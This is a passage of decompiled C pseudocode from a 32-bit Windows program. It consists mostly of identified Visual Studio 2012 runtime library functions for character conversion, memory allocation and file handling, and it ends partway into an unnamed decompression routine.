  }
  return iVar2;
}



// Library Function - Single Match
//  __wctomb_s_l
// 
// Library: Visual Studio 2012 Release

errno_t __cdecl
__wctomb_s_l(int *_SizeConverted,char *_MbCh,size_t _SizeInBytes,wchar_t _WCh,_locale_t _Locale)

{
  char *lpMultiByteStr;
  size_t cbMultiByte;
  int *piVar1;
  int iVar2;
  DWORD DVar3;
  int iVar4;
  int local_14 [2];
  int local_c;
  char local_8;
  
  cbMultiByte = _SizeInBytes;
  lpMultiByteStr = _MbCh;
  if ((_MbCh == (char *)0x0) && (_SizeInBytes != 0)) {
    if (_SizeConverted != (int *)0x0) {
      *_SizeConverted = 0;
    }
    return 0;
  }
  if (_SizeConverted != (int *)0x0) {
    *_SizeConverted = -1;
  }
  if (0x7fffffff < _SizeInBytes) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    FUN_00407ceb();
    return 0x16;
  }
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)local_14,_Locale);
  iVar4 = 0;
  if (*(int *)(local_14[0] + 0xa8) == 0) {
    if ((ushort)_WCh < 0x100) {
      if (lpMultiByteStr != (char *)0x0) {
        if (cbMultiByte == 0) goto LAB_00412ddc;
        *lpMultiByteStr = (char)_WCh;
      }
      if (_SizeConverted != (int *)0x0) {
        *_SizeConverted = 1;
      }
      goto LAB_00412d61;
    }
    if ((lpMultiByteStr != (char *)0x0) && (cbMultiByte != 0)) {
      FUN_00409600((uint *)lpMultiByteStr,0,cbMultiByte);
    }
  }
  else {
    _MbCh = (char *)0x0;
    iVar2 = WideCharToMultiByte(*(UINT *)(local_14[0] + 4),0,&_WCh,1,lpMultiByteStr,cbMultiByte,
                                (LPCSTR)0x0,(LPBOOL)&_MbCh);
    if (iVar2 == 0) {
      DVar3 = GetLastError();
      if (DVar3 == 0x7a) {
        if ((lpMultiByteStr != (char *)0x0) && (cbMultiByte != 0)) {
          FUN_00409600((uint *)lpMultiByteStr,0,cbMultiByte);
        }
LAB_00412ddc:
        piVar1 = __errno();
        iVar4 = 0x22;
        *piVar1 = 0x22;
        FUN_00407ceb();
        goto LAB_00412d61;
      }
    }
    else if (_MbCh == (char *)0x0) {
      if (_SizeConverted != (int *)0x0) {
        *_SizeConverted = iVar2;
      }
      goto LAB_00412d61;
    }
  }
  piVar1 = __errno();
  *piVar1 = 0x2a;
  piVar1 = __errno();
  iVar4 = *piVar1;
LAB_00412d61:
  if (local_8 != '\0') {
    *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
  }
  return iVar4;
}



// Library Function - Single Match
//  _wctomb_s
// 
// Library: Visual Studio 2012 Release

errno_t __cdecl _wctomb_s(int *_SizeConverted,char *_MbCh,rsize_t _SizeInBytes,wchar_t _WCh)

{
  errno_t eVar1;
  
  eVar1 = __wctomb_s_l(_SizeConverted,_MbCh,_SizeInBytes,_WCh,(_locale_t)0x0);
  return eVar1;
}



undefined2 __cdecl FUN_00412e0b(undefined2 param_1,FILE *param_2)

{
  uint uVar1;
  WCHAR *pWVar2;
  char *pcVar3;
  FILE *pFVar4;
  byte bVar5;
  WCHAR *pWVar6;
  int *piVar7;
  undefined **ppuVar8;
  undefined3 extraout_var;
  FILE *pFVar9;
  undefined *puVar10;
  FILE *pFVar11;
  longlong lVar12;
  undefined4 local_8;
  
  pFVar4 = param_2;
  pWVar6 = (WCHAR *)__fileno(param_2);
  uVar1 = param_2->_flag;
  if ((uVar1 & 0x82) == 0) {
    piVar7 = __errno();
    *piVar7 = 9;
LAB_00412e30:
    param_2->_flag = param_2->_flag | 0x20;
    return 0xffff;
  }
  if ((uVar1 & 0x40) != 0) {
    piVar7 = __errno();
    *piVar7 = 0x22;
    goto LAB_00412e30;
  }
  pFVar11 = (FILE *)0x0;
  if ((uVar1 & 1) != 0) {
    param_2->_cnt = 0;
    if ((uVar1 & 0x10) == 0) {
      param_2->_flag = uVar1 | 0x20;
      return 0xffff;
    }
    param_2->_ptr = param_2->_base;
    param_2->_flag = uVar1 & 0xfffffffe;
  }
  uVar1 = param_2->_flag;
  param_2->_flag = uVar1 & 0xffffffef | 2;
  param_2->_cnt = 0;
  if (((uVar1 & 0x10c) == 0) &&
     (((ppuVar8 = FUN_00408cc4(), param_2 != (FILE *)(ppuVar8 + 8) &&
       (ppuVar8 = FUN_00408cc4(), param_2 != (FILE *)(ppuVar8 + 0x10))) ||
      (bVar5 = FUN_0040e5f9((uint)pWVar6), CONCAT31(extraout_var,bVar5) == 0)))) {
    __getbuf(param_2);
  }
  if ((param_2->_flag & 0x108U) == 0) {
    local_8 = CONCAT22(local_8._2_2_,param_1);
    param_2 = (FILE *)0x2;
    pFVar11 = (FILE *)FUN_0040a8a4(pWVar6,(WCHAR *)&local_8,(WCHAR *)0x2);
  }
  else {
    pWVar2 = (WCHAR *)param_2->_base;
    pcVar3 = param_2->_ptr;
    param_2->_ptr = (char *)(pWVar2 + 1);
    pFVar9 = (FILE *)(pcVar3 + -(int)pWVar2);
    param_2->_cnt = param_2->_bufsiz + -2;
    if ((int)pFVar9 < 1) {
      if ((pWVar6 == (WCHAR *)0xffffffff) || (pWVar6 == (WCHAR *)0xfffffffe)) {
        puVar10 = &DAT_0041a548;
      }
      else {
        puVar10 = (undefined *)(((uint)pWVar6 & 0x1f) * 0x40 + (&DAT_0041b8c0)[(int)pWVar6 >> 5]);
      }
      if (((puVar10[4] & 0x20) != 0) && (lVar12 = FUN_0040c685((uint)pWVar6,0,0,2), lVar12 == -1))
      goto LAB_00412f58;
    }
    else {
      pFVar11 = (FILE *)FUN_0040a8a4(pWVar6,pWVar2,(WCHAR *)pFVar9);
    }
    *(undefined2 *)param_2->_base = param_1;
    param_2 = pFVar9;
  }
  if (pFVar11 == param_2) {
    return param_1;
  }
LAB_00412f58:
  pFVar4->_flag = pFVar4->_flag | 0x20;
  return 0xffff;
}



// Library Function - Single Match
//  _realloc
// 
// Library: Visual Studio 2012 Release

void * __cdecl _realloc(void *_Memory,size_t _NewSize)

{
  void *pvVar1;
  LPVOID pvVar2;
  int iVar3;
  int *piVar4;
  DWORD DVar5;
  
  if (_Memory == (void *)0x0) {
    pvVar1 = _malloc(_NewSize);
    return pvVar1;
  }
  if (_NewSize == 0) {
    FID_conflict__free(_Memory);
  }
  else {
    do {
      if (0xffffffe0 < _NewSize) {
        __callnewh(_NewSize);
        piVar4 = __errno();
        *piVar4 = 0xc;
        return (void *)0x0;
      }
      if (_NewSize == 0) {
        _NewSize = 1;
      }
      pvVar2 = HeapReAlloc(DAT_0041b8b8,0,_Memory,_NewSize);
      if (pvVar2 != (LPVOID)0x0) {
        return pvVar2;
      }
      if (DAT_0041bbdc == 0) {
        piVar4 = __errno();
        DVar5 = GetLastError();
        iVar3 = __get_errno_from_oserr(DVar5);
        *piVar4 = iVar3;
        return (void *)0x0;
      }
      iVar3 = __callnewh(_NewSize);
    } while (iVar3 != 0);
    piVar4 = __errno();
    DVar5 = GetLastError();
    iVar3 = __get_errno_from_oserr(DVar5);
    *piVar4 = iVar3;
  }
  return (void *)0x0;
}



// Library Function - Single Match
//  __calloc_impl
// 
// Library: Visual Studio 2012 Release

LPVOID __cdecl __calloc_impl(uint param_1,uint param_2,int *param_3)

{
  int iVar1;
  LPVOID pvVar2;
  uint dwBytes;
  
  if ((param_1 == 0) || (param_2 <= 0xffffffe0 / param_1)) {
    dwBytes = param_1 * param_2;
    if (dwBytes == 0) {
      dwBytes = 1;
    }
    do {
      pvVar2 = (LPVOID)0x0;
      if ((dwBytes < 0xffffffe1) &&
         (pvVar2 = HeapAlloc(DAT_0041b8b8,8,dwBytes), pvVar2 != (LPVOID)0x0)) {
        return pvVar2;
      }
      if (DAT_0041bbdc == 0) {
        if (param_3 != (int *)0x0) {
          *param_3 = 0xc;
          return pvVar2;
        }
        return pvVar2;
      }
      iVar1 = __callnewh(dwBytes);
    } while (iVar1 != 0);
    if (param_3 == (int *)0x0) {
      return (LPVOID)0x0;
    }
  }
  else {
    param_3 = __errno();
  }
  *param_3 = 0xc;
  return (LPVOID)0x0;
}



// Library Function - Single Match
//  __chsize_nolock
// 
// Library: Visual Studio 2012 Release

int __cdecl __chsize_nolock(int _FileHandle,longlong _Size)

{
  uint uVar1;
  int iVar2;
  HANDLE pvVar3;
  WCHAR *lpMem;
  int *piVar4;
  int iVar5;
  WCHAR *pWVar6;
  ulong *puVar7;
  BOOL BVar8;
  uint uVar9;
  WCHAR *pWVar10;
  int unaff_EDI;
  bool bVar11;
  bool bVar12;
  ulonglong uVar13;
  longlong lVar14;
  uint in_stack_00000008;
  DWORD DVar15;
  SIZE_T dwBytes;
  uint local_c;
  int local_8;
  
  uVar9 = 0;
  local_c = 0;
  uVar13 = __lseeki64_nolock(_FileHandle,0x100000000,unaff_EDI);
  if (uVar13 == 0xffffffffffffffff) goto LAB_00413121;
  lVar14 = __lseeki64_nolock(_FileHandle,0x200000000,unaff_EDI);
  iVar5 = (int)((ulonglong)lVar14 >> 0x20);
  if (lVar14 == -1) goto LAB_00413121;
  pWVar10 = (WCHAR *)(in_stack_00000008 - (uint)lVar14);
  uVar1 = (uint)(in_stack_00000008 < (uint)lVar14);
  iVar2 = (int)_Size - iVar5;
  local_8 = iVar2 - uVar1;
  if ((local_8 < 0) ||
     ((local_8 == 0 || (SBORROW4((int)_Size,iVar5) != SBORROW4(iVar2,uVar1)) != local_8 < 0 &&
      (pWVar10 == (WCHAR *)0x0)))) {
    if ((local_8 < 1) && (local_8 < 0)) {
      lVar14 = __lseeki64_nolock(_FileHandle,_Size & 0xffffffff,unaff_EDI);
      if (lVar14 == -1) goto LAB_00413121;
      pvVar3 = (HANDLE)FUN_0040fdd6(_FileHandle);
      BVar8 = SetEndOfFile(pvVar3);
      uVar9 = (BVar8 != 0) - 1;
      local_c = (int)uVar9 >> 0x1f;
      if ((uVar9 & local_c) == 0xffffffff) {
        piVar4 = __errno();
        *piVar4 = 0xd;
        puVar7 = ___doserrno();
        DVar15 = GetLastError();
        *puVar7 = DVar15;
        goto LAB_0041321e;
      }
    }
  }
  else {
    dwBytes = 0x1000;
    DVar15 = 8;
    pvVar3 = GetProcessHeap();
    lpMem = (WCHAR *)HeapAlloc(pvVar3,DVar15,dwBytes);
    if (lpMem == (WCHAR *)0x0) {
      piVar4 = __errno();
      *piVar4 = 0xc;
      goto LAB_00413121;
    }
    iVar5 = __setmode_nolock(_FileHandle,0x8000);
    while( true ) {
      pWVar6 = pWVar10;
      if ((-1 < local_8) && ((0 < local_8 || ((WCHAR *)0xfff < pWVar10)))) {
        pWVar6 = (WCHAR *)0x1000;
      }
      pWVar6 = (WCHAR *)FUN_0040a986((WCHAR *)_FileHandle,lpMem,pWVar6);
      if (pWVar6 == (WCHAR *)0xffffffff) break;
      bVar11 = pWVar10 < pWVar6;
      pWVar10 = (WCHAR *)((int)pWVar10 - (int)pWVar6);
      bVar12 = SBORROW4(local_8,(int)pWVar6 >> 0x1f);
      iVar2 = local_8 - ((int)pWVar6 >> 0x1f);
      local_8 = iVar2 - (uint)bVar11;
      if ((local_8 < 0) ||
         ((local_8 == 0 || (bVar12 != SBORROW4(iVar2,(uint)bVar11)) != local_8 < 0 &&
          (pWVar10 == (WCHAR *)0x0)))) goto LAB_00413199;
    }
    puVar7 = ___doserrno();
    if (*puVar7 == 5) {
      piVar4 = __errno();
      *piVar4 = 0xd;
    }
    uVar9 = 0xffffffff;
    local_c = 0xffffffff;
LAB_00413199:
    __setmode_nolock(_FileHandle,iVar5);
    DVar15 = 0;
    pvVar3 = GetProcessHeap();
    HeapFree(pvVar3,DVar15,lpMem);
LAB_0041321e:
    if ((uVar9 & local_c) == 0xffffffff) goto LAB_00413121;
  }
  lVar14 = __lseeki64_nolock(_FileHandle,uVar13 >> 0x20,unaff_EDI);
  if (lVar14 != -1) {
    return 0;
  }
LAB_00413121:
  piVar4 = __errno();
  return *piVar4;
}



undefined4 __cdecl FUN_0041324d(undefined4 *param_1)

{
  int *piVar1;
  
  if (param_1 == (undefined4 *)0x0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    FUN_00407ceb();
    return 0x16;
  }
  *param_1 = DAT_0041bde8;
  return 0;
}



// Library Function - Single Match
//  __setmode_nolock
// 
// Library: Visual Studio 2012 Release

int __cdecl __setmode_nolock(int _FileHandle,int _Mode)

{
  byte *pbVar1;
  byte bVar2;
  char cVar3;
  byte bVar4;
  int iVar5;
  int iVar6;
  int iVar7;
  
  iVar6 = _FileHandle >> 5;
  iVar7 = (_FileHandle & 0x1fU) * 0x40;
  iVar5 = (&DAT_0041b8c0)[iVar6];
  bVar2 = *(byte *)(iVar5 + 4 + iVar7);
  cVar3 = *(char *)(iVar5 + 0x24 + iVar7);
  if (_Mode == 0x4000) {
    *(byte *)(iVar5 + 4 + iVar7) = bVar2 | 0x80;
    pbVar1 = (byte *)((&DAT_0041b8c0)[iVar6] + 0x24 + iVar7);
    *pbVar1 = *pbVar1 & 0x80;
  }
  else if (_Mode == 0x8000) {
    *(byte *)(iVar5 + 4 + iVar7) = bVar2 & 0x7f;
  }
  else {
    if ((_Mode == 0x10000) || (_Mode == 0x20000)) {
      *(byte *)(iVar5 + 4 + iVar7) = bVar2 | 0x80;
      iVar5 = (&DAT_0041b8c0)[iVar6];
      bVar4 = *(byte *)(iVar5 + 0x24 + iVar7) & 0x82 | 2;
    }
    else {
      if (_Mode != 0x40000) goto LAB_00413322;
      *(byte *)(iVar5 + 4 + iVar7) = bVar2 | 0x80;
      iVar5 = (&DAT_0041b8c0)[iVar6];
      bVar4 = *(byte *)(iVar5 + 0x24 + iVar7) & 0x81 | 1;
    }
    *(byte *)(iVar5 + 0x24 + iVar7) = bVar4;
  }
LAB_00413322:
  if ((bVar2 & 0x80) == 0) {
    return 0x8000;
  }
  return (-(uint)((char)(cVar3 * '\x02') >> 1 != '\0') & 0xc000) + 0x4000;
}



// Library Function - Single Match
//  __towlower_l
// 
// Library: Visual Studio 2012 Release

wint_t __cdecl __towlower_l(wint_t _C,_locale_t _Locale)

{
  int iVar1;
  WCHAR WVar2;
  undefined2 in_stack_00000006;
  int local_18 [2];
  int local_10;
  char local_c;
  WCHAR local_8 [2];
  
  WVar2 = L'\xffff';
  if (_C != 0xffff) {
    _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)local_18,_Locale);
    if (*(LPCWSTR *)(local_18[0] + 0xa8) == (LPCWSTR)0x0) {
      WVar2 = _C;
      if ((ushort)(_C - 0x41) < 0x1a) {
        WVar2 = _C + L' ';
      }
    }
    else if (_C < 0x100) {
      iVar1 = _iswctype(_C,1);
      WVar2 = _C;
      if (iVar1 != 0) {
        WVar2 = (WCHAR)*(byte *)(*(int *)(local_18[0] + 0x94) + (__C & 0xffff));
      }
    }
    else {
      iVar1 = ___crtLCMapStringW(*(LPCWSTR *)(local_18[0] + 0xa8),0x100,(LPCWSTR)&_C,1,local_8,1);
      WVar2 = local_8[0];
      if (iVar1 == 0) {
        WVar2 = _C;
      }
    }
    if (local_c != '\0') {
      *(uint *)(local_10 + 0x70) = *(uint *)(local_10 + 0x70) & 0xfffffffd;
    }
  }
  return WVar2;
}



// Library Function - Single Match
//  ___initconout
// 
// Library: Visual Studio 2012 Release

void __cdecl ___initconout(void)

{
  DAT_0041aee4 = CreateFileW(u_CONOUT__00417ec4,0x40000000,3,(LPSECURITY_ATTRIBUTES)0x0,3,0,
                             (HANDLE)0x0);
  return;
}



// Library Function - Single Match
//  _abort
// 
// Library: Visual Studio 2012 Release

void __cdecl _abort(void)

{
  code *pcVar1;
  int iVar2;
  BOOL BVar3;
  
  iVar2 = FUN_004101a7();
  if (iVar2 != 0) {
    _raise(0x16);
  }
  if ((DAT_0041aee8 & 2) != 0) {
    BVar3 = IsProcessorFeaturePresent(0x17);
    if (BVar3 != 0) {
      pcVar1 = (code *)swi(0x29);
      (*pcVar1)();
    }
    __call_reportfault(3,0x40000015,1);
  }
  __exit(3);
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}



// Library Function - Single Match
//  __msize
// 
// Library: Visual Studio 2012 Release

size_t __cdecl __msize(void *_Memory)

{
  int *piVar1;
  SIZE_T SVar2;
  
  if (_Memory == (void *)0x0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    FUN_00407ceb();
    return 0xffffffff;
  }
  SVar2 = HeapSize(DAT_0041b8b8,0,_Memory);
  return SVar2;
}



// Library Function - Single Match
//  _strncmp
// 
// Library: Visual Studio 2012 Release

int __cdecl _strncmp(char *_Str1,char *_Str2,size_t _MaxCount)

{
  byte bVar1;
  uint uVar2;
  int iVar3;
  bool bVar4;
  
  if (_MaxCount != 0) {
    iVar3 = (int)_Str1 - (int)_Str2;
    uVar2 = (uint)_Str2 & 3;
    while( true ) {
      if (uVar2 == 0) {
        while ((((int)_Str2 + iVar3 & 0xfffU) < 0xffd &&
               (uVar2 = *(uint *)((int)_Str2 + iVar3), uVar2 == *(uint *)_Str2))) {
          bVar4 = _MaxCount < 4;
          _MaxCount = _MaxCount - 4;
          if (bVar4 || _MaxCount == 0) {
            return 0;
          }
          _Str2 = (char *)((int)_Str2 + 4);
          if ((~uVar2 & uVar2 + 0xfefefeff & 0x80808080) != 0) {
            return 0;
          }
        }
      }
      bVar1 = *(byte *)((int)_Str2 + iVar3);
      if (bVar1 != *_Str2) {
        return -(uint)(bVar1 < (byte)*_Str2) | 1;
      }
      if (bVar1 == 0) {
        _MaxCount = 0;
      }
      _Str2 = (char *)((int)_Str2 + 1);
      bVar4 = _MaxCount == 0;
      _MaxCount = _MaxCount - 1;
      if (bVar4 || _MaxCount == 0) break;
      uVar2 = (uint)_Str2 & 3;
    }
  }
  return 0;
}



// Library Function - Single Match
//  __strnicmp
// 
// Library: Visual Studio 2012 Release

int __cdecl __strnicmp(char *_Str1,char *_Str2,size_t _MaxCount)

{
  int *piVar1;
  int iVar2;
  
  if (DAT_0041bbfc == 0) {
    if ((_Str1 == (char *)0x0) || (_Str2 == (char *)0x0)) {
      piVar1 = __errno();
      *piVar1 = 0x16;
      FUN_00407ceb();
      iVar2 = 0x7fffffff;
    }
    else {
      if (_MaxCount < 0x80000000) {
        iVar2 = ___ascii_strnicmp(_Str1,_Str2,_MaxCount);
        return iVar2;
      }
      piVar1 = __errno();
      *piVar1 = 0x16;
      FUN_00407ceb();
      iVar2 = 0x7fffffff;
    }
  }
  else {
    iVar2 = __strnicmp_l(_Str1,_Str2,_MaxCount,(_locale_t)0x0);
  }
  return iVar2;
}



// Library Function - Single Match
//  __strnicmp_l
// 
// Library: Visual Studio 2012 Release

int __cdecl __strnicmp_l(char *_Str1,char *_Str2,size_t _MaxCount,_locale_t _Locale)

{
  int *piVar1;
  int iVar2;
  int iVar3;
  int iVar4;
  localeinfo_struct local_14;
  int local_c;
  char local_8;
  
  if (_MaxCount == 0) {
    return 0;
  }
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_14,_Locale);
  iVar3 = 0x7fffffff;
  if (((_Str1 == (char *)0x0) || (_Str2 == (char *)0x0)) || (0x7fffffff < _MaxCount)) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    FUN_00407ceb();
  }
  else if ((local_14.locinfo)->locale_name[2] == (wchar_t *)0x0) {
    iVar3 = ___ascii_strnicmp(_Str1,_Str2,_MaxCount);
  }
  else {
    iVar4 = (int)_Str1 - (int)_Str2;
    do {
      iVar3 = __tolower_l((uint)((byte *)_Str2)[iVar4],&local_14);
      iVar2 = __tolower_l((uint)(byte)*_Str2,&local_14);
      _Str2 = (char *)((byte *)_Str2 + 1);
      _MaxCount = _MaxCount - 1;
      if ((_MaxCount == 0) || (iVar3 == 0)) break;
    } while (iVar3 == iVar2);
    iVar3 = iVar3 - iVar2;
  }
  if (local_8 != '\0') {
    *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
  }
  return iVar3;
}



// WARNING: This is an inlined function
// WARNING: Function: __alloca_probe replaced with injection: alloca_probe
// Library Function - Single Match
//  __alloca_probe_16
// 
// Library: Visual Studio 2012 Release

uint __alloca_probe_16(undefined1 param_1)

{
  uint in_EAX;
  uint uVar1;
  
  uVar1 = 4 - in_EAX & 0xf;
  return in_EAX + uVar1 | -(uint)CARRY4(in_EAX,uVar1);
}



// WARNING: This is an inlined function
// WARNING: Function: __alloca_probe replaced with injection: alloca_probe
// Library Function - Single Match
//  __alloca_probe_8
// 
// Library: Visual Studio

uint __alloca_probe_8(undefined1 param_1)

{
  uint in_EAX;
  uint uVar1;
  
  uVar1 = 4 - in_EAX & 7;
  return in_EAX + uVar1 | -(uint)CARRY4(in_EAX,uVar1);
}



// Library Function - Single Match
//  __isctype_l
// 
// Library: Visual Studio 2012 Release

int __cdecl __isctype_l(int _C,int _Type,_locale_t _Locale)

{
  int iVar1;
  BOOL BVar2;
  localeinfo_struct local_1c;
  int local_14;
  char local_10;
  CHAR local_c;
  CHAR local_b;
  undefined local_a;
  ushort local_8 [2];
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_1c,_Locale);
  if (_C + 1U < 0x101) {
    local_8[0] = (local_1c.locinfo)->pctype[_C];
  }
  else {
    iVar1 = __isleadbyte_l(_C >> 8 & 0xff,&local_1c);
    if (iVar1 == 0) {
      local_b = '\0';
      iVar1 = 1;
      local_c = (CHAR)_C;
    }
    else {
      local_a = 0;
      iVar1 = 2;
      local_c = (CHAR)((uint)_C >> 8);
      local_b = (CHAR)_C;
    }
    BVar2 = ___crtGetStringTypeA
                      (&local_1c,1,&local_c,iVar1,local_8,(local_1c.locinfo)->lc_codepage,1);
    if (BVar2 == 0) {
      if (local_10 != '\0') {
        *(uint *)(local_14 + 0x70) = *(uint *)(local_14 + 0x70) & 0xfffffffd;
      }
      return 0;
    }
  }
  if (local_10 != '\0') {
    *(uint *)(local_14 + 0x70) = *(uint *)(local_14 + 0x70) & 0xfffffffd;
  }
  return (uint)local_8[0] & _Type;
}



// Library Function - Single Match
//  ___crtLCMapStringW
// 
// Library: Visual Studio 2012 Release

int __cdecl
___crtLCMapStringW(LPCWSTR _LocaleName,DWORD _DWMapFlag,LPCWSTR _LpSrcStr,int _CchSrc,
                  LPWSTR _LpDestStr,int _CchDest)

{
  int iVar1;
  
  if (0 < _CchSrc) {
    _CchSrc = _wcsnlen(_LpSrcStr,_CchSrc);
  }
  iVar1 = FUN_00412c14(_LocaleName,_DWMapFlag,_LpSrcStr,_CchSrc,_LpDestStr,_CchDest);
  return iVar1;
}



// Library Function - Single Match
//  ___ascii_strnicmp
// 
// Library: Visual Studio 2012 Release

int __cdecl ___ascii_strnicmp(char *_Str1,char *_Str2,size_t _MaxCount)

{
  char cVar1;
  byte bVar2;
  ushort uVar3;
  uint uVar4;
  bool bVar5;
  
  if (_MaxCount != 0) {
    do {
      bVar2 = *_Str1;
      cVar1 = *_Str2;
      uVar3 = CONCAT11(bVar2,cVar1);
      if (bVar2 == 0) break;
      uVar3 = CONCAT11(bVar2,cVar1);
      uVar4 = (uint)uVar3;
      if (cVar1 == '\0') break;
      _Str1 = (char *)((byte *)_Str1 + 1);
      _Str2 = _Str2 + 1;
      if ((0x40 < bVar2) && (bVar2 < 0x5b)) {
        uVar4 = (uint)CONCAT11(bVar2 + 0x20,cVar1);
      }
      uVar3 = (ushort)uVar4;
      bVar2 = (byte)uVar4;
      if ((0x40 < bVar2) && (bVar2 < 0x5b)) {
        uVar3 = (ushort)CONCAT31((int3)(uVar4 >> 8),bVar2 + 0x20);
      }
      bVar2 = (byte)(uVar3 >> 8);
      bVar5 = bVar2 < (byte)uVar3;
      if (bVar2 != (byte)uVar3) goto LAB_004137a1;
      _MaxCount = _MaxCount - 1;
    } while (_MaxCount != 0);
    _MaxCount = 0;
    bVar2 = (byte)(uVar3 >> 8);
    bVar5 = bVar2 < (byte)uVar3;
    if (bVar2 != (byte)uVar3) {
LAB_004137a1:
      _MaxCount = 0xffffffff;
      if (!bVar5) {
        _MaxCount = 1;
      }
    }
  }
  return _MaxCount;
}



// Library Function - Single Match
//  __tolower_l
// 
// Library: Visual Studio 2012 Release

int __cdecl __tolower_l(int _C,_locale_t _Locale)

{
  uint uVar1;
  int iVar2;
  int *piVar3;
  localeinfo_struct local_1c;
  int local_14;
  char local_10;
  byte local_c;
  undefined local_b;
  CHAR local_8;
  CHAR local_7;
  undefined local_6;
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_1c,_Locale);
  if ((uint)_C < 0x100) {
    if ((local_1c.locinfo)->mb_cur_max < 2) {
      uVar1 = (local_1c.locinfo)->pctype[_C] & 1;
    }
    else {
      uVar1 = __isctype_l(_C,1,&local_1c);
    }
    if (uVar1 == 0) {
      if (local_10 != '\0') {
        *(uint *)(local_14 + 0x70) = *(uint *)(local_14 + 0x70) & 0xfffffffd;
      }
    }
    else {
      _C = (int)(local_1c.locinfo)->pclmap[_C];
      if (local_10 != '\0') {
        *(uint *)(local_14 + 0x70) = *(uint *)(local_14 + 0x70) & 0xfffffffd;
      }
    }
  }
  else {
    if (((local_1c.locinfo)->mb_cur_max < 2) ||
       (iVar2 = __isleadbyte_l(_C >> 8 & 0xff,&local_1c), iVar2 == 0)) {
      piVar3 = __errno();
      *piVar3 = 0x2a;
      local_7 = '\0';
      iVar2 = 1;
      local_8 = (CHAR)_C;
    }
    else {
      local_6 = 0;
      iVar2 = 2;
      local_8 = (CHAR)((uint)_C >> 8);
      local_7 = (CHAR)_C;
    }
    iVar2 = ___crtLCMapStringA(&local_1c,(local_1c.locinfo)->locale_name[2],0x100,&local_8,iVar2,
                               (LPSTR)&local_c,3,(local_1c.locinfo)->lc_codepage,1);
    if (iVar2 == 0) {
      if (local_10 != '\0') {
        *(uint *)(local_14 + 0x70) = *(uint *)(local_14 + 0x70) & 0xfffffffd;
      }
    }
    else if (iVar2 == 1) {
      _C = (int)local_c;
      if (local_10 != '\0') {
        *(uint *)(local_14 + 0x70) = *(uint *)(local_14 + 0x70) & 0xfffffffd;
      }
    }
    else {
      _C = (int)CONCAT11(local_c,local_b);
      if (local_10 != '\0') {
        *(uint *)(local_14 + 0x70) = *(uint *)(local_14 + 0x70) & 0xfffffffd;
      }
    }
  }
  return _C;
}



BOOL IsProcessorFeaturePresent(DWORD ProcessorFeature)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x004138f2. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = IsProcessorFeaturePresent(ProcessorFeature);
  return BVar1;
}



void RtlUnwind(PVOID TargetFrame,PVOID TargetIp,PEXCEPTION_RECORD ExceptionRecord,PVOID ReturnValue)

{
                    // WARNING: Could not recover jumptable at 0x004138f8. Too many branches
                    // WARNING: Treating indirect jump as call
  RtlUnwind(TargetFrame,TargetIp,ExceptionRecord,ReturnValue);
  return;
}



// Library Function - Single Match
//  __alldiv
// 
// Library: Visual Studio

undefined8 __alldiv(uint param_1,uint param_2,uint param_3,uint param_4)

{
  ulonglong uVar1;
  longlong lVar2;
  uint uVar3;
  int iVar4;
  uint uVar5;
  uint uVar6;
  uint uVar7;
  uint uVar8;
  bool bVar10;
  char cVar11;
  uint uVar9;
  
  cVar11 = (int)param_2 < 0;
  if ((bool)cVar11) {
    bVar10 = param_1 != 0;
    param_1 = -param_1;
    param_2 = -(uint)bVar10 - param_2;
  }
  if ((int)param_4 < 0) {
    cVar11 = cVar11 + '\x01';
    bVar10 = param_3 != 0;
    param_3 = -param_3;
    param_4 = -(uint)bVar10 - param_4;
  }
  uVar3 = param_1;
  uVar5 = param_3;
  uVar6 = param_2;
  uVar9 = param_4;
  if (param_4 == 0) {
    uVar3 = param_2 / param_3;
    iVar4 = (int)(((ulonglong)param_2 % (ulonglong)param_3 << 0x20 | (ulonglong)param_1) /
                 (ulonglong)param_3);
  }
  else {
    do {
      uVar8 = uVar9 >> 1;
      uVar5 = uVar5 >> 1 | (uint)((uVar9 & 1) != 0) << 0x1f;
      uVar7 = uVar6 >> 1;
      uVar3 = uVar3 >> 1 | (uint)((uVar6 & 1) != 0) << 0x1f;
      uVar6 = uVar7;
      uVar9 = uVar8;
    } while (uVar8 != 0);
    uVar1 = CONCAT44(uVar7,uVar3) / (ulonglong)uVar5;
    iVar4 = (int)uVar1;
    lVar2 = (ulonglong)param_3 * (uVar1 & 0xffffffff);
    uVar3 = (uint)((ulonglong)lVar2 >> 0x20);
    uVar5 = uVar3 + iVar4 * param_4;
    if (((CARRY4(uVar3,iVar4 * param_4)) || (param_2 < uVar5)) ||
       ((param_2 <= uVar5 && (param_1 < (uint)lVar2)))) {
      iVar4 = iVar4 + -1;
    }
    uVar3 = 0;
  }
  if (cVar11 == '\x01') {
    bVar10 = iVar4 != 0;
    iVar4 = -iVar4;
    uVar3 = -(uint)bVar10 - uVar3;
  }
  return CONCAT44(uVar3,iVar4);
}



uint FUN_00425719(int param_1,byte *param_2,undefined4 *param_3)

{
  byte *pbVar1;
  byte *pbVar2;
  uint uVar3;
  int iVar4;
  uint *puVar5;
  int iVar6;
  int iVar7;
  undefined4 *puVar8;
  uint uVar9;
  uint uVar10;
  int local_30;
  int local_2c;
  uint local_28;
  int local_24;
  int local_20;
  int local_1c;
  int local_18;
  uint local_14;
  int local_10;
  byte *local_c;
  byte local_5;
  
  local_18 = 1;
  local_20 = 1;
  local_1c = 1;
  local_2c = 1;
  puVar8 = param_3;
  for (iVar4 = 0x30736; iVar4 != 0; iVar4 = iVar4 + -1) {
    *puVar8 = 0x400;
    puVar8 = puVar8 + 1;
  }
  local_c = param_2;
  local_14 = 0;
  local_5 = 0;
  local_10 = 0;
  param_2 = (byte *)0x0;
  pbVar1 = (byte *)0xffffffff;
  iVar4 = 5;
  do {
    param_2 = (byte *)((int)param_2 << 8 | (uint)*local_c);
